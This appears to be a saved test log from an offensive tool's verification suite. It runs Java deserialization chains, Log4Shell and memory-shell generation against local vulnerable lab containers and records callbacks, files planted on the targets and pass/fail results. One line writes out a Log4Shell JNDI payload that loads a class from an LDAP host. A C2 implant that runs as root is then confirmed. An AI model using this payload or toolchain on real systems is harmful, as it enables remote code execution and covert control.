@@ -1,0 +1,224 @@
+======================================================================
+  OOBserver Chain Verification Suite
+  CT1=http://localhost:8010  CT2=http://localhost:8888
+  OOB callback: http://host.docker.internal:8010/callback/http
+======================================================================
+[+] Logged in as admin
+
+[*] Target reachability:
+  [+] vulnlab     :8888 reachable (200 at /health)
+  [+] log4shell   :8081 reachable (HTTP 404 at /health)
+  [+] shiro       :8082 reachable (200 at /health)
+  [+] java8-old   :8891 reachable (200 at /health)
+  [+] java7       :8892 reachable (200 at /health)
+  [+] java17      :8893 reachable (200 at /health)
+  [+] spring3     :8894 reachable (200 at /health)
+  [+] cb2         :8895 reachable (200 at /health)
+
+[*] Section 1a: ysoserial chains → vulnlab :8888
+    [★] RCE file confirmed: /tmp/oobx_2b75d13adad4 exists on vuln-vulnlab
+  [21:18:24] ✅ PASS ysoserial_cc5                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_2b75d13adad4 ✓
+    [★] RCE file confirmed: /tmp/oobx_6a34397e2ac0 exists on vuln-vulnlab
+  [21:18:25] ✅ PASS ysoserial_cc6                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_6a34397e2ac0 ✓
+    [★] RCE file confirmed: /tmp/oobx_3a009bf7652b exists on vuln-vulnlab
+  [21:18:26] ✅ PASS ysoserial_cc7                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_3a009bf7652b ✓
+    [★] RCE file confirmed: /tmp/oobx_3f2975089899 exists on vuln-vulnlab
+  [21:18:27] ✅ PASS ysoserial_cb1                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_3f2975089899 ✓
+    [★] RCE file confirmed: /tmp/oobx_28cd8f58b9a6 exists on vuln-vulnlab
+  [21:18:27] ✅ PASS cb_no_cc                                      callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_28cd8f58b9a6 ✓
+    [★] RCE file confirmed: /tmp/oobx_a45eadf7918d exists on vuln-vulnlab
+  [21:18:29] ✅ PASS ysoserial_rome                                callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_a45eadf7918d ✓
+    [★] RCE file confirmed: /tmp/oobx_38e34c53939b exists on vuln-vulnlab
+  [21:18:30] ✅ PASS ysoserial_hibernate1                          callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_38e34c53939b ✓
+
+[*] Section 1b: ysoserial cc1/cc3 → java7 :8892 (AIH fix in JDK 8u71+; java7 is pre-patch)
+  [21:18:42] ❌ FAIL ysoserial_cc1                                 no OOB callback + no RCE file (deser resp=200: OK)
+  [21:18:55] ❌ FAIL ysoserial_cc3                                 no OOB callback + no RCE file (deser resp=200: OK)
+    [★] RCE file confirmed: /tmp/oobx_466ab27b4849 exists on vuln-vulnlab
+  [21:18:56] ✅ PASS ysoserial_groovy1                             callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_466ab27b4849 ✓
+
+[*] Section 1c: java7 container (:8892) — ysoserial_jdk7u21 (Java 7 JVM in sidecar) + cc6
+  [21:19:08] ❌ FAIL ysoserial_jdk7u21                             no OOB callback + no RCE file (deser resp=200: OK)
+    [★] RCE file confirmed: /tmp/oobx_bb9204f2a894 exists on vuln-java7
+  [21:19:10] ✅ PASS ysoserial_cc6                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_bb9204f2a894 ✓
+
+[*] Section 1d: ysoserial spring1/spring2 → spring3 :8894
+  [21:19:10] ⏭  SKIP ysoserial_spring1                             AnnotationInvocationHandler CVE-2014-0428 fix strips map keys (JDK 8u5+/7u51+); chain requires JDK < 7u51
+  [21:19:10] ⏭  SKIP ysoserial_spring2                             AnnotationInvocationHandler CVE-2014-0428 fix strips map keys (JDK 8u5+/7u51+); chain requires JDK < 7u51
+
+[*] URLDNS / JRMPClient:
+  [21:19:19] ⏭  SKIP ysoserial_urldns                              DNS-only chain; no OOB DNS resolver configured
+    [★] RCE file confirmed: /tmp/oobx_b42974c13533 exists on vuln-java8old
+  [21:19:21] ✅ PASS ysoserial_jrmp_client                         callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_b42974c13533 ✓
+
+[*] Section 2a: jchains native chains → vulnlab :8888
+    [★] RCE file confirmed: /tmp/oobx_e99bb57ab774 exists on vuln-vulnlab
+  [21:19:21] ✅ PASS jchains_native_cc6                            callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_e99bb57ab774 ✓
+    [★] RCE file confirmed: /tmp/oobx_5b7566be6f36 exists on vuln-vulnlab
+  [21:19:21] ✅ PASS jchains_native_cb1                            callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_5b7566be6f36 ✓
+    [★] RCE file confirmed: /tmp/oobx_a183694c9302 exists on vuln-vulnlab
+  [21:19:23] ✅ PASS jchains_native_k1_secondary                   callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_a183694c9302 ✓
+    [★] RCE file confirmed: /tmp/oobx_b49c54542a64 exists on vuln-vulnlab
+  [21:19:24] ✅ PASS jchains_cc1                                   callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_b49c54542a64 ✓
+    [★] RCE file confirmed: /tmp/oobx_837f7f5d6256 exists on vuln-vulnlab
+  [21:19:25] ✅ PASS jchains_cc3                                   callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_837f7f5d6256 ✓
+    [★] RCE file confirmed: /tmp/oobx_844635f2db2b exists on vuln-vulnlab
+  [21:19:27] ✅ PASS jchains_cc6                                   callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_844635f2db2b ✓
+    [★] RCE file confirmed: /tmp/oobx_9a2dc322ab72 exists on vuln-vulnlab
+  [21:19:28] ✅ PASS jchains_native_jackson                        callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_9a2dc322ab72 ✓
+  [21:19:40] ❌ FAIL jchains_native_c3p0_el                        no OOB callback + no RCE file (deser resp=200: EX: Failed to acquire the Context necessary to lookup an Obj)
+  [21:19:40] ✅ PASS jchains_native_cb1_jndi                       callback from 172.20.0.1:48710 proto=ldap
+  [21:19:53] ❌ FAIL jchains_native_c3p0_ldap                      no OOB callback (deser resp=200: EX: Failed to acquire the Context necessary to lookup an Obj)
+    [★] RCE file confirmed: /tmp/oobx_65cdbd51e9ae exists on vuln-java8old
+  [21:19:53] ✅ PASS ysoserial_cc2                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_65cdbd51e9ae ✓
+    [★] RCE file confirmed: /tmp/oobx_7bff67cbce7f exists on vuln-java8old
+  [21:19:53] ✅ PASS ysoserial_cc4                                 callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_7bff67cbce7f ✓
+    [★] RCE file confirmed: /tmp/oobx_a3512e3989ea exists on vuln-java8old
+  [21:19:54] ✅ PASS jchains_cc2                                   callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_a3512e3989ea ✓
+    [★] RCE file confirmed: /tmp/oobx_366ffbee61dc exists on vuln-java8old
+  [21:19:54] ✅ PASS jchains_cc4                                   callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_366ffbee61dc ✓
+
+[*] Section 2b: jchains jdk17 chains → java17 :8893
+    [★] RCE file confirmed: /tmp/oobx_868f2865f824 exists on vuln-java17
+  [21:19:54] ✅ PASS jchains_native_jdk17_1                        callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_868f2865f824 ✓
+    [★] RCE file confirmed: /tmp/oobx_ec42b276189a exists on vuln-java17
+  [21:19:54] ✅ PASS jchains_native_jdk17_2                        callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_ec42b276189a ✓
+
+[*] Section 2c: jchains_native_cb2 → cb2 :8895
+    [★] RCE file confirmed: /tmp/oobx_755c74920de4 exists on vuln-cb2
+  [21:19:56] ✅ PASS jchains_native_cb2                            callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_755c74920de4 ✓
+
+[*] Section 3: Hessian1 chains (→ /hessian)
+  [21:19:57] ✅ PASS hessian1_spring                               callback from 172.20.0.1:49928
+  [21:19:57] ✅ PASS jchains_hessian1_spring                       callback from 172.20.0.1:49984
+  [21:19:57] ✅ PASS jchains_hessian1_spring2                      callback from 172.20.0.1:50006
+    [★] RCE file confirmed: /tmp/oobx_344b2859d072 exists on vuln-vulnlab
+  [21:19:59] ✅ PASS jchains_hessian1_exec                         callback from 172.20.0.1 + RCE file /tmp/oobx_344b2859d072 ✓
+    [★] RCE file confirmed: /tmp/oobx_5fdc71f728a1 exists on vuln-vulnlab
+  [21:20:00] ✅ PASS jchains_hessian1_rome1                        callback from 172.20.0.1 + RCE file /tmp/oobx_5fdc71f728a1 ✓
+    [★] RCE file confirmed: /tmp/oobx_cd1782e5db8a exists on vuln-vulnlab
+  [21:20:00] ✅ PASS jchains_hessian1_rome2                        callback from 172.20.0.1 + RCE file /tmp/oobx_cd1782e5db8a ✓
+  [21:20:12] ❌ FAIL jchains_hessian1_secondary                    no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=sun.swing.SwingLazyValue@17d9fc6d}={aaa=sun)
+  [21:20:25] ❌ FAIL jchains_hessian1_bcel                         no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=javax.swing.UIDefaults$ProxyLazyValue@5af86)
+  [+] spring3 reachable (200 at /health)
+  [21:20:37] ❌ FAIL jchains_hessian1_spring_exec                  no OOB callback + no RCE file (resp=200: OK)
+  [+] spring3 reachable (200 at /health)
+  [21:20:50] ❌ FAIL jchains_hessian2_spring_exec                  no OOB callback + no RCE file (resp=200: OK)
+  [21:20:50] ✅ PASS hessian2_spring                               callback from 172.20.0.1:43574
+
+[*] Section 4: Hessian2 chains (→ /hessian2)
+  [21:20:50] ✅ PASS jchains_hessian2_spring                       callback from 172.20.0.1:43716
+  [21:20:51] ✅ PASS jchains_hessian2_spring2                      callback from 172.20.0.1:43744
+    [★] RCE file confirmed: /tmp/oobx_257e9610380c exists on vuln-vulnlab
+  [21:20:51] ✅ PASS jchains_hessian2_exec                         callback from 172.20.0.1 + RCE file /tmp/oobx_257e9610380c ✓
+    [★] RCE file confirmed: /tmp/oobx_7073d0ef4f7e exists on vuln-vulnlab
+  [21:20:51] ✅ PASS jchains_hessian2_rome1                        callback from 172.20.0.1 + RCE file /tmp/oobx_7073d0ef4f7e ✓
+    [★] RCE file confirmed: /tmp/oobx_02bd8f04408d exists on vuln-vulnlab
+  [21:20:53] ✅ PASS jchains_hessian2_rome2                        callback from 172.20.0.1 + RCE file /tmp/oobx_02bd8f04408d ✓
+  [21:21:06] ❌ FAIL jchains_hessian2_secondary                    no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=sun.swing.SwingLazyValue@57998c6a}={aaa=sun)
+  [21:21:18] ❌ FAIL jchains_hessian2_bcel                         no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=javax.swing.UIDefaults$ProxyLazyValue@52fe9)
+    [★] RCE file confirmed: /tmp/oobx_e626243cee26 exists on vuln-vulnlab
+  [21:21:20] ✅ PASS jchains_hessian2_tostring_jackson             callback from 172.20.0.1 + RCE file /tmp/oobx_e626243cee26 ✓
+  [21:21:33] ❌ FAIL jchains_hessian2_tostring_xbean               no OOB callback + no RCE file (resp=200: EX: unknown code for readObject at 0x43 (C))
+
+[*] Section 5: FastJSON chains (→ /fastjson)
+  [21:21:33] ✅ PASS fastjson_jdbcrowset                           callback from 172.20.0.1:50124
+  [21:21:33] ✅ PASS fastjson_jdbcrowset_v2                        callback from 172.20.0.1:50138
+  [21:21:46] ❌ FAIL fastjson_bcel                                 no OOB callback + no RCE file (resp=200: OK: org.apache.commons.dbcp.BasicDataSource@3ed8999)
+  [21:21:46] ✅ PASS jchains_fastjson                              callback from 172.20.0.1:37458
+  [21:21:58] ❌ FAIL jchains_fastjson_bcel                         no OOB callback + no RCE file (resp=200: OK: org.apache.commons.dbcp.BasicDataSource@769478e3)
+  [21:21:58] ✅ PASS jchains_fastjson_jndi                         callback from 172.20.0.1:56906
+    [★] RCE file confirmed: /tmp/oobx_c36cda4ada05 exists on vuln-vulnlab
+  [21:22:00] ✅ PASS jchains_fastjson_c3p0_h2                      callback from 172.20.0.1 + RCE file /tmp/oobx_c36cda4ada05 ✓
+
+[*] Section 6: XStream chains (→ /xstream)
+  [21:22:00] ✅ PASS xstream_eventhandler                          callback from 172.20.0.1
+  [21:22:01] ✅ PASS jchains_xstream                               callback from 172.20.0.1:42718
+  [21:22:02] ✅ PASS jchains_xstream_exec                          callback from 172.20.0.1
+  [21:22:02] ✅ PASS jchains_xstream_jndi                          callback from 172.20.0.1:42738
+
+[*] Section 7: Log4Shell
+  [21:22:03] ✅ PASS log4shell_vulnlab                             LDAP callback (proto=ldap)
+  [21:22:03] ✅ PASS log4shell_dedicated                           LDAP callback from 172.20.0.1:42760
+
+[*] Section 8: Shiro chains
+    [★] RCE file confirmed: /tmp/oobx_6b9af4950db6 exists on vuln-shiro
+  [21:22:03] ✅ PASS shiro_cbc                                     callback from 172.20.0.1 + RCE file /tmp/oobx_6b9af4950db6 ✓
+    [★] RCE file confirmed: /tmp/oobx_612b35f4dd10 exists on vuln-shiro
+  [21:22:03] ✅ PASS shiro_gcm                                     callback from 172.20.0.1 + RCE file /tmp/oobx_612b35f4dd10 ✓
+    [★] RCE file confirmed: /tmp/oobx_2a53637b52b7 exists on vuln-shiro
+  [21:22:04] ✅ PASS jchains_shiro_cbc                             callback from 172.20.0.1 + RCE file /tmp/oobx_2a53637b52b7 ✓
+
+[*] Section 9: C3P0 / H2 / BlazeDS chains
+  [-] blazeds :8896 NOT reachable
+    [★] RCE file confirmed: /tmp/oobx_8be114e72003 exists on vuln-vulnlab
+  [21:22:14] ✅ PASS c3p0_jndi                                     callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_8be114e72003 ✓
+    [★] RCE file confirmed: /tmp/oobx_db2a2aa1878e exists on vuln-vulnlab
+  [21:22:16] ✅ PASS c3p0_wrapperds                                callback from 172.20.0.1 proto=http + RCE file /tmp/oobx_db2a2aa1878e ✓
+  [-] blazeds :8896 NOT reachable
+  [21:22:24] ⏭  SKIP jchains_blazeds_axis2                         blazeds target not running (:8896)
+    [★] RCE file confirmed: /tmp/oobx_11e20455bdcd exists on vuln-vulnlab
+  [21:22:26] ✅ PASS jchains_h2_jdbc                               callback from 172.20.0.1 + RCE file ✓
+
+[*] Section 10: JNDI ResourceRef chains (LDAP Reference → local factory RCE)
+  [21:22:26] ✅ PASS jchains_jndi_tomcat_el                        callback from 172.20.0.1:49596
+  [21:22:26] ✅ PASS jchains_jndi_groovy                           callback from 172.20.0.1:49618
+  [21:22:27] ✅ PASS jchains_jndi_beanshell                        callback from 172.20.0.1:49630
+    [★] RCE file confirmed: /tmp/oobx_77bc63aef290 exists on vuln-vulnlab
+  [21:22:29] ✅ PASS jchains_jndi_snakeyaml                        callback from 172.20.0.1 + RCE file /tmp/oobx_77bc63aef290 ✓
+
+  ── Memshell generation smoke tests ──────────────────────────────
+  [21:22:29] ✅ PASS ms_tomcat_filter_cmd                          bytecode=1892b class=com.sun.proxy.$TomcFShell
+  [21:22:29] ✅ PASS ms_tomcat_filter_behinder                     bytecode=2375b class=com.sun.proxy.$TomcFShell
+  [21:22:29] ✅ PASS ms_tomcat_filter_godzilla                     bytecode=1868b class=com.sun.proxy.$TomcFShell
+  [21:22:29] ✅ PASS ms_tomcat_filter_c2                           bytecode=3939b class=oobx.C2Hdlf4348079
+  [21:22:29] ✅ PASS ms_tomcat_valve_cmd                           bytecode=1892b class=com.sun.proxy.$TomcVShell
+  [21:22:29] ✅ PASS ms_tomcat_listener_cmd                        bytecode=1892b class=com.sun.proxy.$TomcLShell
+  [21:22:29] ✅ PASS ms_tomcat_servlet_cmd                         bytecode=1892b class=com.sun.proxy.$TomcSShell
+  [21:22:29] ✅ PASS ms_tomcat_executor_cmd                        bytecode=1892b class=com.sun.proxy.$TomcEShell
+  [21:22:29] ✅ PASS ms_spring_interceptor_cmd                     bytecode=1892b class=com.sun.proxy.$SpriIShell
+  [21:22:29] ✅ PASS ms_spring_controller_cmd                      bytecode=1892b class=com.sun.proxy.$SpriCShell
+  [21:22:29] ✅ PASS ms_spring_webflux_cmd                         bytecode=1892b class=com.sun.proxy.$SpriWShell
+  [21:22:29] ✅ PASS ms_jetty_filter_cmd                           bytecode=1892b class=com.sun.proxy.$JettFShell
+  [21:22:29] ✅ PASS ms_jboss_filter_cmd                           bytecode=1892b class=com.sun.proxy.$JbosFShell
+  [21:22:29] ✅ PASS ms_weblogic_filter_cmd                        bytecode=1892b class=com.sun.proxy.$WeblFShell
+
+[*] Section 12: C2 Memshell (★ primary focus ★)
+
+  ── C2 Memshell Serialize delivery test ──────────────────────────
+  [*] Serialize payload: 7876 bytes, sending to /deser
+  [*] POST to /deser: HTTP 200. Waiting 40s for agent...
+  [21:22:29] ✅ PASS c2_memshell_serialize                         agent registered from vulnlab deser: 09d395b595eae007
+
+  ── C2 Memshell JNDI injection test ──────────────────────────────
+  [*] Generated: class=oobx.C2Hdl82d98b07, token=82d98b0748c9..., ldap=ldap://host.docker.internal:1389/82d98b0748c9/oobx.C2Hdl82d98b07
+  [*] Sending Log4Shell payload: ${jndi:ldap://host.docker.internal:1389/82d98b0748c9/oobx.C2Hdl82d98b07}
+  [*] Injected via http://localhost:8888/log4shell
+  [*] JNDI lookup recorded: proto=http from=172.20.0.1
+  [*] Waiting up to 40s for C2 agent registration...
+  [+] C2 agent registered: id=d552179eb0b56bb2 last_seen=2026-04-29T13:22:29.918810
+  [*] Sending command: id
+  [*] Waiting for command result...
+  [21:22:34] ✅ PASS c2_memshell_jndi                              C2 exec result: uid=0(root) gid=0(root) groups=0(root)
+
+══════════════════════════════════════════════════════════════════════
+  TOTAL 93  ✅ PASS 75  ❌ FAIL 14  ⏭  SKIP 4  ⚠️  ERR 0
+══════════════════════════════════════════════════════════════════════
+
+Failed/Error chains:
+  ysoserial_cc1: no OOB callback + no RCE file (deser resp=200: OK)
+  ysoserial_cc3: no OOB callback + no RCE file (deser resp=200: OK)
+  ysoserial_jdk7u21: no OOB callback + no RCE file (deser resp=200: OK)
+  jchains_native_c3p0_el: no OOB callback + no RCE file (deser resp=200: EX: Failed to acquire the Context necessary to lookup an Obj)
+  jchains_native_c3p0_ldap: no OOB callback (deser resp=200: EX: Failed to acquire the Context necessary to lookup an Obj)
+  jchains_hessian1_secondary: no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=sun.swing.SwingLazyValue@17d9fc6d}={aaa=sun)
+  jchains_hessian1_bcel: no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=javax.swing.UIDefaults$ProxyLazyValue@5af86)
+  jchains_hessian1_spring_exec: no OOB callback + no RCE file (resp=200: OK)
+  jchains_hessian2_spring_exec: no OOB callback + no RCE file (resp=200: OK)
+  jchains_hessian2_secondary: no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=sun.swing.SwingLazyValue@57998c6a}={aaa=sun)
+  jchains_hessian2_bcel: no OOB callback + no RCE file (resp=200: OK: {{}={}, {aaa=javax.swing.UIDefaults$ProxyLazyValue@52fe9)
+  jchains_hessian2_tostring_xbean: no OOB callback + no RCE file (resp=200: EX: unknown code for readObject at 0x43 (C))
+  fastjson_bcel: no OOB callback + no RCE file (resp=200: OK: org.apache.commons.dbcp.BasicDataSource@3ed8999)
+  jchains_fastjson_bcel: no OOB callback + no RCE file (resp=200: OK: org.apache.commons.dbcp.BasicDataSource@769478e3)
+
+  Report saved: C:\Users\Lenovo\Desktop\pentestagent\oobserver-next\tests\verify_report.json
